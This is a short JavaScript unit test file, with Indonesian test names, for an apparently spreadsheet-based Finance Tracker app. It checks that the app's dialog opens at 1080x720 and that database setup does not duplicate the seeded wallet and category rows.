test("UI: openAppDialog membuka dialog berukuran 1080x720 dengan judul Finance Tracker", () => {
  const h = createHarness({ sheets: baseSheets(), properties: ALLOW });
  h.sandbox.openAppDialog();

  assert.equal(h.uiLog.modals.length, 1);
  const modal = h.uiLog.modals[0];
  assert.equal(modal.title, "Finance Tracker");
  assert.equal(modal.html._width, 1080);
  assert.equal(modal.html._height, 720);
});

test("Setup: ensureDatabaseStructure bersifat idempoten dan tidak menduplikasi data", () => {
  const h = createHarness({ sheets: {}, properties: ALLOW });
  h.sandbox.ensureDatabaseStructure();

  const walletsCount1 = h.sheetsObj.DOMPET.rows.length;
  const catsCount1 = h.sheetsObj.KATEGORI.rows.length;
  assert.equal(walletsCount1, 4); // header + 3 seeds

  h.sandbox.ensureDatabaseStructure();

  assert.equal(h.sheetsObj.DOMPET.rows.length, walletsCount1);
  assert.equal(h.sheetsObj.KATEGORI.rows.length, catsCount1);
});
